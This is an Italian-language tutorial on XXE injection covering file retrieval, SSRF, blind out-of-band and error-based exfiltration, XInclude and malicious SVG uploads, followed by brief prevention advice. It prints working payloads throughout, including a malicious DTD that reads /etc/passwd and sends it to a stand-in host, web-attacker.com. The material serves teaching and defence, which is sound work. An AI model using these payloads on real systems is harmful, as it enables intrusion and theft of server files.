La XML external entity injection (nota anche come XXE) è una vulnerabilità di sicurezza web che consente a un aggressore di interferire con l'elaborazione di dati XML da parte di un'applicazione. Spesso consente a un aggressore di visualizzare file sul file system del server applicativo e di interagire con qualsiasi sistema back-end o esterno a cui l'applicazione stessa può accedere.

In alcune situazioni, un aggressore può intensificare un attacco XXE per compromettere il server sottostante o altre infrastrutture back-end, sfruttando la vulnerabilità XXE per eseguire attacchi di falsificazione delle richieste lato server (SSRF).
### Come nascono le vulnerabilità XXE?
Alcune applicazioni utilizzano il formato XML per trasmettere dati tra il browser e il server. Le applicazioni che lo fanno utilizzano quasi sempre una libreria standard o una API di piattaforma per elaborare i dati XML sul server. Le vulnerabilità XXE sorgono perché la specifica XML contiene varie funzionalità potenzialmente pericolose e i parser standard supportano queste funzionalità anche se non sono normalmente utilizzate dall'applicazione.

Le entità esterne XML sono un tipo di entità XML personalizzata i cui valori definiti vengono caricati dall'esterno del DTD in cui sono dichiarati. Le entità esterne sono particolarmente interessanti dal punto di vista della sicurezza perché consentono di definire un'entità in base al contenuto di un percorso di file o di un URL.
### Quali sono i tipi di attacchi XXE?
Esistono vari tipi di attacchi XXE:
- sfruttamento di XXE per recuperare file, dove un'entità esterna è definita contenente il contenuto di un file e restituita nella risposta dell'applicazione;
- sfruttamento di XXE per eseguire attacchi SSRF, dove un'entità esterna è definita in base a un URL a un sistema back-end;
- sfruttamento di blind XXE, dove i dati sensibili vengono trasmessi dal server applicativo a un sistema controllato dall'aggressore;
- sfruttamento di blind XXE per recuperare dati tramite messaggi di errore, dove l'aggressore può attivare un messaggio di errore di analisi contenente dati sensibili.
## Sfruttare XXE per recuperare i file
Per eseguire un attacco di XXE injection che recupera un file arbitrario dal file system del server, è necessario modificare l'XML inviato in due modi:
- introdurre (o modificare) un elemento DOCTYPE che definisce un'entità esterna contenente il percorso al file;
- modificare un valore di dati nell'XML restituito nella risposta dell'applicazione, per utilizzare l'entità esterna definita.

Ad esempio, supponiamo che un'applicazione di acquisto controlli il livello di scorta di un prodotto inviando il seguente XML al server:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

L'applicazione non esegue particolari difese contro gli attacchi XXE, quindi puoi sfruttare la vulnerabilità XXE per recuperare il file /etc/passwd inviando il seguente payload XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

Questo payload XXE definisce un'entità esterna `&xxe;` il cui valore è il contenuto del file /etc/passwd e utilizza l'entità all'interno del valore productId. Ciò fa sì che la risposta dell'applicazione includa il contenuto del file:
```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

**Nota:** con le vulnerabilità XXE del mondo reale, ci sarà spesso un gran numero di valori di dati all'interno dell'XML inviato, uno qualsiasi dei quali potrebbe essere utilizzato all'interno della risposta dell'applicazione. Per testare sistematicamente le vulnerabilità XXE, in genere sarà necessario testare ogni nodo di dati nell'XML individualmente, utilizzando l'entità definita e verificando se appare all'interno della risposta.
## Sfruttare XXE per eseguire attacchi SSRF
Oltre al recupero di dati sensibili, l'altro impatto principale degli attacchi XXE è che possono essere utilizzati per eseguire falsificazioni di richieste lato server (SSRF). Questa è una vulnerabilità potenzialmente seria in cui l'applicazione lato server può essere indotta a effettuare richieste HTTP a qualsiasi URL a cui il server può accedere.

Per sfruttare una vulnerabilità XXE per eseguire un attacco SSRF, è necessario definire un'entità XML esterna utilizzando l'URL che si desidera indirizzare e utilizzare l'entità definita all'interno di un valore di dati. Se è possibile utilizzare l'entità definita all'interno di un valore di dati restituito nella risposta dell'applicazione, sarà possibile visualizzare la risposta dall'URL all'interno della risposta dell'applicazione e quindi ottenere un'interazione bidirezionale con il sistema back-end. In caso contrario, sarà possibile eseguire solo attacchi SSRF blind (che possono comunque avere conseguenze critiche).

Nel seguente esempio XXE, l'entità esterna farà sì che il server effettui una richiesta HTTP back-end a un sistema interno all'interno dell'infrastruttura dell'organizzazione:
`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`
## Blind XXE
Le vulnerabilità blind XXE si verificano quando l'applicazione è vulnerabile alla XXE injection ma non restituisce i valori di alcuna entità esterna definita nelle sue risposte. Ciò significa che il recupero diretto dei file lato server non è possibile e quindi le blind XXE sono generalmente più difficili da sfruttare rispetto alle normali vulnerabilità XXE.

Esistono due modi generali in cui è possibile trovare e sfruttare le vulnerabilità blind XXE:
- è possibile attivare interazioni di rete out-of-band, a volte esfiltrando dati sensibili all'interno dei dati di interazione;
- è possibile attivare errori di analisi XML in modo tale che i messaggi di errore contengano dati sensibili.
### Rilevamento di blind XXE mediante tecniche out-of-band (OAST)
Spesso è possibile rilevare blind XXE utilizzando la stessa tecnica degli attacchi XXE SSRF, ma attivando l'interazione di rete out-of-band con un sistema da te controllato. Ad esempio, definiresti un'entità esterna come segue:
`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>`
Potresti quindi utilizzare l'entità definita in un valore dati all'interno dell'XML.

Questo attacco XXE fa sì che il server effettui una richiesta HTTP back-end all'URL specificato. L'aggressore può monitorare la ricerca DNS e la richiesta HTTP risultanti e quindi rilevare che l'attacco XXE ha avuto successo.

A volte, gli attacchi XXE che utilizzano entità regolari vengono bloccati, a causa di una convalida di input da parte dell'applicazione o di un rafforzamento del parser XML utilizzato. In questa situazione, potresti essere in grado di utilizzare entità parametro XML. Le entità parametro XML sono un tipo speciale di entità XML a cui è possibile fare riferimento solo altrove all'interno del DTD. Ai fini del presente articolo, devi solo sapere due cose. Innanzitutto, la dichiarazione di un'entità parametro XML include il carattere percentuale prima del nome dell'entità:
`<!ENTITY % myparameterentity "my parameter entity value" >`
E in secondo luogo, le entità parametro sono referenziate utilizzando il carattere percentuale anziché la solita e commerciale:
`%myparameterentity;`

Ciò significa che puoi testare XXE cieco utilizzando il rilevamento out-of-band tramite entità parametro XML come segue:
`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`
Questo payload XXE dichiara un'entità parametro XML denominata xxe e quindi utilizza l'entità all'interno del DTD. Ciò causerà una ricerca DNS e una richiesta HTTP al dominio dell'attaccante, verificando che l'attacco abbia avuto successo.
### Sfruttare il blind XXE per esfiltrare i dati out-of-band
Rilevare una vulnerabilità blind XXE tramite tecniche out-of-band è tutto molto bello, ma non dimostra effettivamente come la vulnerabilità potrebbe essere sfruttata. Ciò che un aggressore vuole realmente ottenere è esfiltrare dati sensibili. Ciò può essere ottenuto tramite una vulnerabilità blind XXE, ma implica che l'aggressore ospiti un DTD dannoso su un sistema che controlla e quindi invochi il DTD esterno dall'interno del payload XXE in-band.

Un esempio di DTD dannoso per esfiltrare il contenuto del file /etc/passwd è il seguente:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Questo DTD esegue i seguenti passaggi:
- definisce un'entità parametro XML denominata file, contenente il contenuto del file /etc/passwd;
- definisce un'entità parametro XML denominata eval, contenente una dichiarazione dinamica di un'altra entità parametro XML denominata exfiltrate. L'entità exfiltrate verrà valutata effettuando una richiesta HTTP al server web dell'attaccante contenente il valore dell'entità file all'interno della stringa di query URL;
- utilizza l'entità eval, che determina l'esecuzione della dichiarazione dinamica dell'entità exfiltrate;
- utilizza l'entità exfiltrate, in modo che il suo valore venga valutato richiedendo l'URL specificato.

L'attaccante deve quindi ospitare il DTD dannoso su un sistema che controlla, normalmente caricandolo sul proprio server web. Ad esempio, l'attaccante potrebbe servire il DTD dannoso al seguente URL:
`http://web-attacker.com/malicious.dtd`

Infine, l'attaccante deve inviare il seguente payload XXE all'applicazione vulnerabile:
`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>`
Questo payload XXE dichiara un'entità parametro XML chiamata xxe e quindi utilizza l'entità all'interno del DTD. Ciò farà sì che il parser XML recuperi il DTD esterno dal server dell'attaccante e lo interpreti in linea. I passaggi definiti all'interno del DTD dannoso vengono quindi eseguiti e il file /etc/passwd viene trasmesso al server dell'attaccante.

**Nota:** questa tecnica potrebbe non funzionare con alcuni contenuti di file, inclusi i caratteri di nuova riga contenuti nel file /etc/passwd. Questo perché alcuni parser XML recuperano l'URL nella definizione dell'entità esterna utilizzando un'API che convalida i caratteri che possono apparire all'interno dell'URL. In questa situazione, potrebbe essere possibile utilizzare il protocollo FTP anziché HTTP. A volte, non sarà possibile esfiltrare dati contenenti caratteri di nuova riga, quindi è possibile prendere di mira un file come /etc/hostname.
### Sfruttare il blind XXE per recuperare dati tramite messaggi di errore
Un approccio alternativo per sfruttare il blind XXE è quello di attivare un errore di analisi XML in cui il messaggio di errore contiene i dati sensibili che si desidera recuperare. Ciò sarà efficace se l'applicazione restituisce il messaggio di errore risultante nella sua risposta.

È possibile attivare un messaggio di errore di analisi XML contenente il contenuto del file /etc/passwd utilizzando un DTD esterno dannoso come segue:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
Questo DTD esegue i seguenti passaggi:
- definisce un'entità parametro XML denominata file, contenente il contenuto del file /etc/passwd;
- definisce un'entità parametro XML denominata eval, contenente una dichiarazione dinamica di un'altra entità parametro XML denominata error. L'entità error verrà valutata caricando un file inesistente il cui nome contiene il valore dell'entità file;
- utilizza l'entità eval, che determina l'esecuzione della dichiarazione dinamica dell'entità error;
- utilizza l'entità error, in modo che il suo valore venga valutato tentando di caricare il file inesistente, con conseguente messaggio di errore contenente il nome del file inesistente, che è il contenuto del file /etc/passwd.

L'invocazione del DTD esterno dannoso comporterà un messaggio di errore come il seguente:
`java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin ...`
## Trovare una superficie di attacco nascosta per l'XXE injection
La superficie di attacco per le vulnerabilità di XXE injection è ovvia in molti casi, perché il normale traffico HTTP dell'applicazione include richieste che contengono dati in formato XML. In altri casi, la superficie di attacco è meno visibile. Tuttavia, se guardi nei posti giusti, troverai la superficie di attacco XXE nelle richieste che non contengono alcun XML.
### Attacchi XInclude
Alcune applicazioni ricevono dati inviati dal client, li incorporano sul lato server in un documento XML e quindi analizzano il documento. Un esempio di ciò si verifica quando i dati inviati dal client vengono inseriti in una richiesta SOAP back-end, che viene quindi elaborata dal servizio SOAP back-end.

In questa situazione, non puoi eseguire un classico attacco XXE, perché non controlli l'intero documento XML e quindi non puoi definire o modificare un elemento DOCTYPE. Tuttavia, potresti essere in grado di utilizzare XInclude. XInclude è una parte della specifica XML che consente di creare un documento XML da sotto-documenti. È possibile posizionare un attacco XInclude all'interno di qualsiasi valore di dati in un documento XML, in modo che l'attacco possa essere eseguito in situazioni in cui si controlla solo un singolo elemento di dati che viene inserito in un documento XML lato server.

Per eseguire un attacco XInclude, è necessario fare riferimento allo spazio dei nomi XInclude e fornire il percorso al file che si desidera includere. Ad esempio:
`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
### Attacchi XXE tramite caricamento file
Alcune applicazioni consentono agli utenti di caricare file che vengono poi elaborati lato server. Alcuni formati di file comuni utilizzano XML o contengono sottocomponenti XML. Esempi di formati basati su XML sono formati di documenti Office come DOCX e formati di immagini come SVG.

Ad esempio, un'applicazione potrebbe consentire agli utenti di caricare immagini ed elaborarle o convalidarle sul server dopo che sono state caricate. Anche se l'applicazione si aspetta di ricevere un formato come PNG o JPEG, la libreria di elaborazione delle immagini utilizzata potrebbe supportare le immagini SVG. Poiché il formato SVG utilizza XML, un aggressore può inviare un'immagine SVG dannosa e quindi raggiungere una superficie di attacco nascosta per le vulnerabilità XXE.

Un esempio di un’immagine SVG dannosa per avere informazioni sul file etc/hostname è la seguente:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
## Come prevenire le vulnerabilità XXE
Praticamente tutte le vulnerabilità XXE si verificano perché la libreria di analisi XML dell'applicazione supporta funzionalità XML potenzialmente pericolose di cui l'applicazione non ha bisogno o non intende utilizzare. Il modo più semplice ed efficace per prevenire gli attacchi XXE è disabilitare tali funzionalità.

In genere, è sufficiente disabilitare la risoluzione delle entità esterne e disabilitare il supporto per XInclude. Ciò può essere solitamente eseguito tramite opzioni di configurazione o sovrascrivendo a livello di programmazione il comportamento predefinito. Consulta la documentazione per la tua libreria di analisi XML o API per i dettagli su come disabilitare le funzionalità non necessarie.
